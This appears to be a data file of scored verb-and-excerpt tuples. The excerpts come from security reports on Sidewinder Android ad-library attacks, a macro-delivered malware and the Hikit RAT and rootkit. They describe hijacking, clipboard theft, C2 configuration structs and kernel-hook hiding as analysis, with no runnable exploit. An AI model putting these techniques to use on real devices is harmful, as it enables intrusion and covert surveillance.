etc')(0.8888888888888888, 'installing', '\n</footnote>\n\n\n\n<footer>3 www.fireeye.com</footer>\n\x0c\n<header>FireEye: Sidewinder Targeted Attack against Android</header>\n\n\n\n\nincluding uploading local files, taking pictures,                 \nrecording audio/video, manipulating the                           \nclipboard, sending SMS, dialing numbers,                          \nimplanting bootkit, or installing the attacker’s                  \napps uploaded to Google Play, etc')(0.25, 'recording', '\n</footnote>\n\n\n\n<footer>3 www.fireeye.com</footer>\n\x0c\n<header>FireEye: Sidewinder Targeted Attack against Android</header>\n\n\n\n\nincluding uploading local files, taking pictures,                 \nrecording audio/video, manipulating the                           \nclipboard, sending SMS, dialing numbers,                          \nimplanting bootkit, or installing the attacker’s                  \napps uploaded to Google Play, etc')(0.4, 'manipulating', '\n</footnote>\n\n\n\n<footer>3 www.fireeye.com</footer>\n\x0c\n<header>FireEye: Sidewinder Targeted Attack against Android</header>\n\n\n\n\nincluding uploading local files, taking pictures,                 \nrecording audio/video, manipulating the                           \nclipboard, sending SMS, dialing numbers,                          \nimplanting bootkit, or installing the attacker’s                  \napps uploaded to Google Play, etc')(0.5555555555555556, 'inject', ' However, if an ad library uses the\n@JavascriptInterface annotation to expose\nsecurity-sensitive interfaces, and uses HTTP to\nload content in the WebView, it is vulnerable to\nattacks where an attacker over the network\ncould inject malicious content into the WebView\nto misuse the interfaces exposed through the JS\nbinding annotation')(1.0, 'monitor', ' Any UID has the capability                              \nto manipulate clipboard via the API calls in Listing 6:                       \n\n\nUsing these APIs, the attackers can monitor\nchanges to a clipboard and transfer the\nclipboard contents to some remote server')(0.8, 'transfer', ' Any UID has the capability                              \nto manipulate clipboard via the API calls in Listing 6:                       \n\n\nUsing these APIs, the attackers can monitor\nchanges to a clipboard and transfer the\nclipboard contents to some remote server')(0.3448275862068966, 'enables', " The left panel enables the\nattacker to command the victim's device,\n\n<footnote>\n1\n \t Ranjit Atwal, Lillian Tay, Roberta Cozza, Tuong Huy Nguyen, Tracy Tsai, Annette Zimmermann, and CK Lu")(0.29411764705882354, 'keep', ' Attackers keep a     \nlow profile by allowing all other irrelevant            \nnetwork traffic to pass without being modified')(1.0, 'inject', ' If the attackers can hijack                      \nthe communication channels and inject malicious                          \nDEX files, they can then control the behaviors of                        \nthe victim apps')(0.5, 'hijack', ' If the attackers can hijack                      \nthe communication channels and inject malicious                          \nDEX files, they can then control the behaviors of                        \nthe victim apps')(0.75, 'control', ' If the attackers can hijack                      \nthe communication channels and inject malicious                          \nDEX files, they can then control the behaviors of                        \nthe victim apps')(0.4117647058823529, 'manipulate', ' For example,\nthe attackers can manipulate Android home                                     \nscreen icons using two normal permissions:                                    \nlauncher READ SETTINGS and WRITE                                              \nSETTINGS permissions')(0.4166666666666667, 'steal', ' Malicious                                    \napps can steal the passwords if they can read                                 \nthe contents on clipboard')(0.10638297872340426, 'conduct', '                              \nBy leveraging all these vulnerabilities, an attacker                             \ncan conduct more targeted attacks, which we call                                 \n“Sidewinder Targeted Attacks.” In this paper we                                  \nexplain the security risks from such attacks, in                                 \nwhich an attacker can intercept and use private                                  \ninformation uploaded from ad libraries to                                        \nprecisely locate targeted areas such as a CEO’s                                  \noffice or specific conference rooms')(0.8, 'hijack', ' The\nattacker can hijack the network where the\ntargeted victim resides')(0.625, 'execute', ' Listing 1 is a sample\nJavascript snippet to execute shell command')(0.75, 'intercepted', ' In this screenshot, the victim’s\ninstalled app list, clipboard, a photo taken from\nthe back camera, an audio clip, and a video clip\nhave been uploaded, with the GPS location\nintercepted from the ad library')(0.25, 'obtain', '\nThus, as long as attackers can get the JBOH shell,\nthey have the tools to obtain root on most\nAndroid phone models')(0.38461538461538464, 'corrupting', '\n\nBGP hijacking takes over groups of IP addresses,\ncorrupting Internet routing tables by breaking\nBGP sessions or injecting fake BGP information')(0.8, 'alter', '\nThey can also alter the clipboard content to\nachieve phishing goals')(0.5, 'exploit', ' Furthermore, the                                  \nattackers can exploit several Android                                            \nvulnerabilities to get valuable private information                              \nor to launch more advanced attacks')(0.25, 'inject', ' After that,        \nthey can inject exploits only into the targeted         \ntraffic to launch further attacks')(0.22727272727272727, 'use', '\n</section>                                                                         <section>\n<heading>Root Exploits and Code Injection</heading>\nOne direct threat posed by JBOH is to use the\nJBOH shell (Listing 1) to download exe- cutables\nand use them to root the device')(0.7777777777777778, 'intercepted', ' We successfully launched Man-in-the-\nMiddle (MITM) attacks and intercepted the data\nuploaded to the remote server')(0.625, 'launched', ' We successfully launched Man-in-the-\nMiddle (MITM) attacks and intercepted the data\nuploaded to the remote server')(0.8333333333333334, 'change', ' For example, the user\nmay copy a link to visit and the background\nmalicious service can change that link to a\nphishing site')(1.0, 'authenticate', ' We verified                             \nthat Android apps with these two permissions can                             \nauthenticate themselves with the user’s Google                               \naccount, allowing access to Google Play and the                              \nability send app installation requests')(0.5, 'taking', '                                                        \n                                                                         \nTo launch more sophisticated attacks like sending                        \nSMS or taking pictures, the attackers may use                            \nJava reflection to call other APIs from the\nJavascript bridge')(0.5, 'sending', '                                                        \n                                                                         \nTo launch more sophisticated attacks like sending                        \nSMS or taking pictures, the attackers may use                            \nJava reflection to call other APIs from the\nJavascript bridge')(0.6923076923076923, 'access', ' By DNS\nhijacking, attackers can effectively access all the\ntraffic to ad servers')(0.2857142857142857, 'compromised', ' Attackers successfully\ncompromised many DNS servers, including the\nones from Google and Godaddy<fn>24</fn>')(0.75, 'install', ' Through the                          \nJavascript bridge, attackers can install apps of                             \nchoice (e.g., an attacker’s phishing app) to any                             \ndevices registered in user’s account in the                                  \nbackground without user consent')(0.76, 'modify', '\n                                                                              \nAs a proof-of-concept attack scenario, a malicious                            \napp with these two permissions can query/insert/                              \nalter the system icon settings and modify                                     \nlegitimate icons of some security- sensitive apps,                            \nsuch as banking apps, to a phishing website')(0.42105263157894735, 'hijack', '\n\nARP hijacking (or spoofing) in IDC<fn>26</fn> is done to\nhijack the traffic to the ad server in the IDC where\nthe ad server locates through fake ARP packets')(0.7692307692307693, 'launch', ' In later sections, we\ndiscuss attacking (“warhead”) and targeting\n(“homing”) components in detail and show how a\ncombination of these components can launch\npowerful and precise attacks on target devices')(0.7857142857142857, 'utilizing', ' Given that this ad                            \nlibrary loads ads using HTTP, if the host app has                        \nthe corresponding permissions (e.g., CALL\nPHONE), attackers over the network can abuse                             \nthese interfaces to do malicious things (e.g.,                           \nutilizing the makeCall interface to dial phone                           \nnumbers without the user’s consent)')(0.8125, 'pins', ' The panel also\npins down the GPS location of the victim’s\ndevice onto a Google Map widget')(0.5238095238095238, 'subvert', '                                     \n                                                                             \nIn this context, DNS hijacking is done to subvert\nthe resolution of Domain Name System (DNS)                                   \nqueries through modifying the behavior of DNS                                \nservers so that they serve fake DNS information')(0.6666666666666666, 'choose', '\nTo minimize detection chances, the attacker can\nchoose to take action on important targets only,\nignoring all other devices')(0.5, 'achieve', ' Unfortunately, several                             \nwell-known attacks can be used to achieve                                    \nlarge-scale monitoring, including DNS hijacking,                             \nBGP hijacking, and ARP hijacking in IDC')(0.75, 'monitor', '\nThis enables attackers to monitor all traffic to\nspecific IPs')(0.15, 'call', ' Once\nloaded, the code can obtain context as described\nin Listing 4, or call DexClassLoaderload<fn>12</fn> to\ninject new classes from the attackers’ DEX\nfiles to register callbacks to take pictures/\nrecord videos')(0.25, 'delivered', '\n</section>\n\n<section>\nBack to square one:\n\nFrom what we have seen so far, the malware is being delivered as a Microsoft Office Word (.doc) email\nattachment, containing a malicious macro called AutoOpen')(1.0, 'control', '\n\nAs seen, the malware uses a number of RATs to control its victims or track their activity')(0.4666666666666667, 'uses', '\n\nAs seen, the malware uses a number of RATs to control its victims or track their activity')(0.2, 'track', '\n\nAs seen, the malware uses a number of RATs to control its victims or track their activity')(1.0, 'packed', ' Stolen data was packed and sent encrypted over HTTP\nrandom ports')(0.42857142857142855, 'sent', ' Stolen data was packed and sent encrypted over HTTP\nrandom ports')(0.35294117647058826, 'modifying', '\n\nThe malware is in plain view, modifying commonplace registry entries, such as the startup configurations,\nand not covering its tracks')(0.38461538461538464, 'accept', ' The RAT functionality provides an attacker with the ability to\nestablish a phantom network within a victim’s infrastructure by having individual instances of Gen 2 DLL\nlisten for incoming connections on local ports (presumably, NAT’d ports) and accept commands from\nthe inbound connection')(0.5, 'ensure', ' It is unclear why this code exists given that the DLL will check\nthe Driver version and correct the Driver if necessary prior to reaching the portion of the code that\nreports the\t\n \xa0DRIVER_MIN_VERSION.\t\n \xa0It is possible that the second Driver version check is a last ditch\neffort to ensure the correct Driver is installed')(0.36363636363636365, 'provides', '<doc>                                                                                                            \t\n \xa0\n\t\n \xa0\n<section>\n<heading>Hikit Analysis</heading>\n</section>\n<section>\n<heading>Basic Description</heading>\nHikit consists of at least two generations of malware that provides basic RAT functionality')(0.36363636363636365, 'uses', ' In order for the\nDLL to load, Gen 2 (starting with Gen 2.1) uses a loader application (referred to simply as “the\nLoader”)')(0.8928571428571429, 'employs', '\n</section>\n<section>\n<heading>Gen 2 Driver</heading>\nThe Gen 2 sub-family, beginning with Gen 2.0 Beta, employs a Windows device driver (“the Driver”) to\nhide aspects of the DLL’s functionality from normal system processes')(0.1, 'listing', ' The remote shell function uses\nthe standard pipe redirection method for interfacing a network application (in this case, the DLL) to a\nhidden command shell.\t\n</section>\n \xa0\n<section>\n<heading>Command: \xa0file </heading>\xa0\nThe\t\n \xa0file\t\n \xa0command provides an attacker with a variety of disk access options such as listing\ndirectories, changing the current directory, and uploading and downloading files')(0.5, 'downloading', ' The remote shell function uses\nthe standard pipe redirection method for interfacing a network application (in this case, the DLL) to a\nhidden command shell.\t\n</section>\n \xa0\n<section>\n<heading>Command: \xa0file </heading>\xa0\nThe\t\n \xa0file\t\n \xa0command provides an attacker with a variety of disk access options such as listing\ndirectories, changing the current directory, and uploading and downloading files')(0.9130434782608695, 'allows', ' The dwHikitVersion\t\nfield allows the client and\nthe DLL to ensure that they have a compatible communication scheme in place prior to executing\ncommands')(1.0, 'use', ' The standalone Loaders use\nthe\t\nMatrixMain\t\nfunction while the DLL Loaders will call the\t\nStartServer\t\nfunction')(0.7142857142857143, 'call', ' The standalone Loaders use\nthe\t\nMatrixMain\t\nfunction while the DLL Loaders will call the\t\nStartServer\t\nfunction')(0.8181818181818182, 'install', '\n\t\n \xa0\n</table>\nIf the i\t\n \xa0parameter is given, the DLL will install itself as a service on the victim’s machine')(0.42857142857142855, 'hide', ' To further\nreduce the footprint of the driver, the RAT functionality code also uses the cloaking functionality of the\nrootkit to hide the DLL’s PID, any references to the GUID {4AE26357-79A3-466D-A6D9-\nFC38BFB67DEA}, the DLL’s service names (e.g')(0.75, 'creates', ' The\nDriver also creates a symbolic link to the device using the same name but under the\t\n\\DosDevices\\\t\n\ntree.\t\xa0\t\n\nFor reasons unknown, the authors of the Driver used code from a Chinese blog that details how to hide\nnetwork connections on Windows Vista and later decided to keep the example IP address within the\ncode')(0.75, 'utilize', '\n</section>\n<section>\n<heading>Command: \xa0proxy (Gen 1.2 and later), socks5 \xa0(Gen 1.0 and 1.1) \xa0</heading>\nThe\t\n \xa0proxy\t\n \xa0(or\t\n \xa0socks5) command allows an attacker to utilize a Hikit-infected machine as a proxy')(0.4666666666666667, 'hooks', ' In\norder to hide these items, the Driver hooks various Windows Kernel API calls')(0.6, 'activates', ' port forwarding) through\n                                  another Hikit sample\n       socks5        Gen 1.0      Establishes a forwarding proxy (retired in Gen 1.2)\n       proxy         Gen 1.2      Establishes a forwarding proxy\n       information   Gen 2.0      Returns the configuration for the Hikit infection\n                     Alpha\n       exit          Gen 1.0      Terminates a channel\n</table>\n</section>\n<section>\n<heading>Command: \xa0shell \xa0</heading>\nThe\t\n \xa0shell\t\n \xa0command activates a remote shell on the victim’s computer')(0.625, 'supported', '\n</section>\n<section>\n<heading>Functionality and Commands</heading>\nThe Hikit family has supported roughly the same set of commands since the first known samples of\nGen 1.0')(0.5, 'calls', '\n<code>\n        struct ImageHeader\n        {\n           DWORD dwImageEncodedSize;\n           DWORD dwImageSizeDecompressed;\n           DWORD EncodingKey;\n        };\n</code>\n\nLoadEmbeddedImage\t\n \xa0copies the compressed embedded DLL into a newly allocated heap buffer and\nthen calls the function\t\n \xa0decodeBuffer\t\n \xa0(using the\t\n \xa0EncodingKey\t\n \xa0value) to decrypt the embedded DLL')(1.0, 'copies', '\n<code>\n        struct ImageHeader\n        {\n           DWORD dwImageEncodedSize;\n           DWORD dwImageSizeDecompressed;\n           DWORD EncodingKey;\n        };\n</code>\n\nLoadEmbeddedImage\t\n \xa0copies the compressed embedded DLL into a newly allocated heap buffer and\nthen calls the function\t\n \xa0decodeBuffer\t\n \xa0(using the\t\n \xa0EncodingKey\t\n \xa0value) to decrypt the embedded DLL')(1.0, 'loading', '\n\nAfter loading the embedded DLL image into memory, the Loader will either call the DLL’s\t\n\nStartServer\t\nor\t\nMatrixMain\t\nfunction depending on the type of Loader')(0.7777777777777778, 'call', '\n\nAfter loading the embedded DLL image into memory, the Loader will either call the DLL’s\t\n\nStartServer\t\nor\t\nMatrixMain\t\nfunction depending on the type of Loader')(0.8823529411764706, 'has', ' Once connected, the operator has\nthe basic Hikit functionalities available to them via commands such as file and shell')(0.7142857142857143, 'load', '\nWith the embedded DLL now decompressed into a heap buffer, LoadEmbeddedImage\t\n \xa0calls\t\n \xa0\nImageLoaderData::LoadDll\t\n \xa0to manually load the DLL into memory')(0.3, 'calls', '\nWith the embedded DLL now decompressed into a heap buffer, LoadEmbeddedImage\t\n \xa0calls\t\n \xa0\nImageLoaderData::LoadDll\t\n \xa0to manually load the DLL into memory')(0.15, 'loading', ' Both versions of the Loader begin by loading the embedded DLL from the Loader’s resources\n(item 102 under the Group Icons resource tree), decrypting and decompressing the image into memory,\nthen manually loading the DLL into memory using a custom loading routine')(0.5925925925925926, 'calling', '\nUpon activation, the Driver will expose its interface by calling\t\nIoCreateDevice\t\nwith the name\n\\Device\\agony\t\n(for Gen 2.0 Beta samples), \\Device\\HTTPS\t\n(for Gen 2.1 samples),\t\n\n\\Device\\advcachemgr\t\n(for Gen 2.2 samples) or \\Device\\diskdump\t\n(for Gen 2.3 samples)')(0.75, 'hide', ' Additionally, the code also attempts to hide a service named “Hitx”')(0.7142857142857143, 'access', ' The first\ngeneration of Hikit (referred to as “Gen 1”) operates as a server and requires an externally exposed\nnetwork interface in order for an attacker to access the victim machine')(0.23529411764705882, 'operates', ' The first\ngeneration of Hikit (referred to as “Gen 1”) operates as a server and requires an externally exposed\nnetwork interface in order for an attacker to access the victim machine')(0.9, 'send', ' The DLL will send a legitimate SSL certificate as a means to disrupt heuristic IDS\nsensors that look for encrypted traffic')(1.0, 'remove', ' If the uninstall argument exists,\t\n \xa0mainThread\t\n \xa0will simply remove the\nDriver from the victim’s machine and terminate')(1.0, 'supports', ' The\nRAT supports the following commands:\n<table>\n\n       Command       Introduced   Description\n       shell         Gen 1.0      Establishes a remote command shell on the victim machine\n       file          Gen 1.0      File managerment\n       connect       Gen 1.0      Establishes a tunnel connection (e.g')(0.7, 'install', ' Following this, the DLL will then attempt to install the correct\nversion of the Driver prior to terminating')(0.8181818181818182, 'install', '\n\n\n\n\n\t\n \xa0\n\x0c\t\n \xa0\n\n<code>\n       struct Config\n       {\n          WCHAR wszComment[32];\n          C2ConfigInfo arrC2s[2];\n          ListeningPortConfig ListeningPorts[10];\n          int dwStartTime;\n          int dwEndTime;\n          __int16 Flags;\n          SYSTEMTIME sleepUntil;\n          __int16 unused_align2_2;\n          int fRunHidden;\n       };\n\n       struct C2ConfigInfo\n       {\n          WCHAR wszAddress[32];\n          __int16 wPort;\n          __int16 unused_align2;\n          int fValidC2;\n       };\n\n       struct ListeningPortConfig\n       {\n          unsigned __int16 wPort;\n          unsigned __int16 unused_align2;\n          int fReady;\n          SOCKET hSocket;\n          HANDLE hEvent;\n          HANDLE hListenerThread;\n       };\n\t\n</code>\n\nIn order to provide some level of stealth, the RAT will install a rootkit on 32-bit versions of Windows')(0.375, 'hide', ' The following table maps\nthe items the Driver can hide to the API function that the Driver hooks:\n<table>\n        Item                                                                                                                                                        API Function Hooked\n        Process ID                                                                                                                                                  ZwDeviceIoControlFile\n        (PID)\n        Registry Key                                                                                                                                                ZwEnumerateKey\n        Registry Value                                                                                                                                              ZwEnumerateValueKey\n        Directory                                                                                                                                                   QueryDirectoryFile\n\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0 \t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\n<footnote>\n1\n  \t\n \xa0James\t\n \xa0Antognini\t\n \xa0and\t\n \xa0Thomas\t\n \xa0F.\t\n \xa0Divine.\t\n \xa0“Extending\t\n \xa0the\t\n \xa0Microsoft\t\n \xa0PassThru\t\n \xa0NDIS\t\n \xa0Intermediate\t\n \xa0Driver—Parts:\t\n \xa0Two\t\n \xa0IP\t\n \xa0\nAddress\t\n \xa0Blocking\t\n \xa0NDIS\t\n \xa0IM\t\n \xa0Drivers”.\t\n \xa0December\t\n \xa015,\t\n \xa02003\t\n \xa0\n2\n  \t\n \xa0pudn.\t\n \xa0“Agony\t\n \xa0Rootkit\t\n \xa0code,\t\n \xa0the\t\n \xa0stability\t\n \xa0and\t\n \xa0can\t\n \xa0be\t\n \xa0useful\t\n \xa0Driver\t\n \xa0Develop”.\t\n \xa0\nhttp://en.pudn.com/downloads74/sourcecode/windows/vxd/detail265112_en.html.\t\n \xa08\t\n \xa0April\t\n \xa02007.\t\n \xa0\t\n \xa0\n3\n  \t\n \xa0CardMagic.\t\n \xa0“[Reserved]\t\n \xa0NSI\t\n \xa0Module\t\n \xa0Hook:\t\n \xa0Hiding\t\n \xa0Port\t\n \xa0Under\t\n \xa0Windows\t\n \xa0Vista”.\t\n \xa0http://forum.eviloctal.com/archiver/tid-\xad‐\n29604.html.\t\n \xa08\t\n \xa0July\t\n \xa02007.\t\n</footnote>\n \xa0\n\n\n\t\n \xa0\n\x0c\t\n \xa0\n\n\n       Item              API Function Hooked\n       Local Listening   ZwDeviceIoControlFile\n       Port\n       Remote            ZwDeviceIoControlFile\n       Endpoint\n       Loaded Drivers    ZwQuerySystemInformation\n\t\n</table>\n\nIn order to hide services, the Driver will access the memory of the services.exe process, locate the\nlinked list of services and remove the service entry that the Driver wishes to hide')(0.8, 'remove', ' The following table maps\nthe items the Driver can hide to the API function that the Driver hooks:\n<table>\n        Item                                                                                                                                                        API Function Hooked\n        Process ID                                                                                                                                                  ZwDeviceIoControlFile\n        (PID)\n        Registry Key                                                                                                                                                ZwEnumerateKey\n        Registry Value                                                                                                                                              ZwEnumerateValueKey\n        Directory                                                                                                                                                   QueryDirectoryFile\n\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0 \t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\n<footnote>\n1\n  \t\n \xa0James\t\n \xa0Antognini\t\n \xa0and\t\n \xa0Thomas\t\n \xa0F.\t\n \xa0Divine.\t\n \xa0“Extending\t\n \xa0the\t\n \xa0Microsoft\t\n \xa0PassThru\t\n \xa0NDIS\t\n \xa0Intermediate\t\n \xa0Driver—Parts:\t\n \xa0Two\t\n \xa0IP\t\n \xa0\nAddress\t\n \xa0Blocking\t\n \xa0NDIS\t\n \xa0IM\t\n \xa0Drivers”.\t\n \xa0December\t\n \xa015,\t\n \xa02003\t\n \xa0\n2\n  \t\n \xa0pudn.\t\n \xa0“Agony\t\n \xa0Rootkit\t\n \xa0code,\t\n \xa0the\t\n \xa0stability\t\n \xa0and\t\n \xa0can\t\n \xa0be\t\n \xa0useful\t\n \xa0Driver\t\n \xa0Develop”.\t\n \xa0\nhttp://en.pudn.com/downloads74/sourcecode/windows/vxd/detail265112_en.html.\t\n \xa08\t\n \xa0April\t\n \xa02007.\t\n \xa0\t\n \xa0\n3\n  \t\n \xa0CardMagic.\t\n \xa0“[Reserved]\t\n \xa0NSI\t\n \xa0Module\t\n \xa0Hook:\t\n \xa0Hiding\t\n \xa0Port\t\n \xa0Under\t\n \xa0Windows\t\n \xa0Vista”.\t\n \xa0http://forum.eviloctal.com/archiver/tid-\xad‐\n29604.html.\t\n \xa08\t\n \xa0July\t\n \xa02007.\t\n</footnote>\n \xa0\n\n\n\t\n \xa0\n\x0c\t\n \xa0\n\n\n       Item              API Function Hooked\n       Local Listening   ZwDeviceIoControlFile\n       Port\n       Remote            ZwDeviceIoControlFile\n       Endpoint\n       Loaded Drivers    ZwQuerySystemInformation\n\t\n</table>\n\nIn order to hide services, the Driver will access the memory of the services.exe process, locate the\nlinked list of services and remove the service entry that the Driver wishes to hide')(1.0, 'access', ' The following table maps\nthe items the Driver can hide to the API function that the Driver hooks:\n<table>\n        Item                                                                                                                                                        API Function Hooked\n        Process ID                                                                                                                                                  ZwDeviceIoControlFile\n        (PID)\n        Registry Key                                                                                                                                                ZwEnumerateKey\n        Registry Value                                                                                                                                              ZwEnumerateValueKey\n        Directory                                                                                                                                                   QueryDirectoryFile\n\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0 \t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\n<footnote>\n1\n  \t\n \xa0James\t\n \xa0Antognini\t\n \xa0and\t\n \xa0Thomas\t\n \xa0F.\t\n \xa0Divine.\t\n \xa0“Extending\t\n \xa0the\t\n \xa0Microsoft\t\n \xa0PassThru\t\n \xa0NDIS\t\n \xa0Intermediate\t\n \xa0Driver—Parts:\t\n \xa0Two\t\n \xa0IP\t\n \xa0\nAddress\t\n \xa0Blocking\t\n \xa0NDIS\t\n \xa0IM\t\n \xa0Drivers”.\t\n \xa0December\t\n \xa015,\t\n \xa02003\t\n \xa0\n2\n  \t\n \xa0pudn.\t\n \xa0“Agony\t\n \xa0Rootkit\t\n \xa0code,\t\n \xa0the\t\n \xa0stability\t\n \xa0and\t\n \xa0can\t\n \xa0be\t\n \xa0useful\t\n \xa0Driver\t\n \xa0Develop”.\t\n \xa0\nhttp://en.pudn.com/downloads74/sourcecode/windows/vxd/detail265112_en.html.\t\n \xa08\t\n \xa0April\t\n \xa02007.\t\n \xa0\t\n \xa0\n3\n  \t\n \xa0CardMagic.\t\n \xa0“[Reserved]\t\n \xa0NSI\t\n \xa0Module\t\n \xa0Hook:\t\n \xa0Hiding\t\n \xa0Port\t\n \xa0Under\t\n \xa0Windows\t\n \xa0Vista”.\t\n \xa0http://forum.eviloctal.com/archiver/tid-\xad‐\n29604.html.\t\n \xa08\t\n \xa0July\t\n \xa02007.\t\n</footnote>\n \xa0\n\n\n\t\n \xa0\n\x0c\t\n \xa0\n\n\n       Item              API Function Hooked\n       Local Listening   ZwDeviceIoControlFile\n       Port\n       Remote            ZwDeviceIoControlFile\n       Endpoint\n       Loaded Drivers    ZwQuerySystemInformation\n\t\n</table>\n\nIn order to hide services, the Driver will access the memory of the services.exe process, locate the\nlinked list of services and remove the service entry that the Driver wishes to hide')(0.7, 'produce', '\n\n\n\n\n\t\n \xa0\n\x0c\t\n \xa0\n\n\nFrom a system objects perspective, Gen 2 samples produce up to three named events')(0.6666666666666666, 'uses', '\n</section>\n<section>\n<heading>Gen 2 Analysis</heading>\nThe Gen 2 sub-family, like Gen 1.2, uses a DLL for the core of its RAT functionality')(0.2857142857142857, 'calling', ' The authors of Gen 1 used freely available source code\nfound online for their removal function.<fn>4</fn>\n\n\n\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0 \t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\t\n \xa0\n<footnote>\n4\n \t\n \xa0PCAUSA.\t\n \xa0“Programmatically\t\n \xa0Installing\t\n \xa0NDIS\t\n \xa0Protocol\t\n \xa0Drivers”\t\n \xa0http://www.ndis.com/ndis-\xad‐\ngeneral/ndisinstall/programinstall.htm.\t\n \xa02\t\n \xa0December\t\n \xa02013.\t\n </footnote>\n \xa0\n\n\n\t\n \xa0\n\x0c\t\n \xa0\n\n\nWhen the DLL activates, either by a call to\t\nDllEntryPoint\t\nor by calling\t\nDllRegisterServer\t\n\nwithout the u parameter,\t\nmainThread\t\nbegins by verifying the version of the Driver installed on the\nvictim’s machine')(0.35294117647058826, 'call', ' The Loaders,\nupon unloading, will call the StopServer function in order to shut down the embedded DLL')(0.3333333333333333, 'provides', '\nThe DLL’s RAT functionality provides basic features such as network port forwarding (proxying), file\ntransfer, and remote command shell')(0.8181818181818182, 'support', ' Each Gen 2 infection can support up to 10 listening ports')(0.5, 'calls', '\nImageLoaderData::LoadDll\t\n \xa0interprets the PE/COFF header of the DLL image, loads the image\ninto the appropriate memory configuration, performs the necessary relocation operations, and calls the\t\n\nDllMain\t\n(DLL’s entry point) function')(0.8888888888888888, 'loads', '\nImageLoaderData::LoadDll\t\n \xa0interprets the PE/COFF header of the DLL image, loads the image\ninto the appropriate memory configuration, performs the necessary relocation operations, and calls the\t\n\nDllMain\t\n(DLL’s entry point) function')(0.8333333333333334, 'generate', ' The DLL contains only two exports: DllEntryPoint\t\n \xa0and\t\n \xa0\nDllRegisterServer.\t\n \xa0Ultimately, both exports generate a new thread of the same function\n(“mainThread”)')(0.631578947368421, 'installs', ' it doesn’t match the specified\nversion), the DLL installs the version of the Driver found within the DLL’s resource section (under the\t\n\nBIN\t\nresource tree).\t\n \xa0\t\n \xa0\n\nWith the Driver version verified (or forcibly corrected by installing the appropriate Driver), the DLL will\ninstruct the Driver to use a specified string (for Gen 1.0 and Gen 1.1 samples) or a DWORD (for Gen\n1.2 samples) as the acknowledgment value to send to a connecting client who requests the appropriate\nURL')(0.11764705882352941, 'installing', ' it doesn’t match the specified\nversion), the DLL installs the version of the Driver found within the DLL’s resource section (under the\t\n\nBIN\t\nresource tree).\t\n \xa0\t\n \xa0\n\nWith the Driver version verified (or forcibly corrected by installing the appropriate Driver), the DLL will\ninstruct the Driver to use a specified string (for Gen 1.0 and Gen 1.1 samples) or a DWORD (for Gen\n1.2 samples) as the acknowledgment value to send to a connecting client who requests the appropriate\nURL')(1.0, 'activates', ' The RAT functionality code then activates the service and opens a handle to\ndevice driver’s interface (e.g')(0.3125, 'interact', ' The purpose of this behavior is to allow the DLL to interact\nwith the network without utilizes the WinSock API which could potentially reveal the presence of Hikit')(0.4375, 'rely', '\n</section>\n<section>\n<heading>Command: \xa0information </heading>\nGen 2 samples rely on a configuration in order to know where the C2 server exists along with other\noperational aspects such as the name of its service and operational times')(0.875, 'generating', '\nWhen the Driver establishes a new channel, the DLL generates a runtime data structure before\ngenerating a new thread (“HikitThreadFunc”) which will service any request coming from the 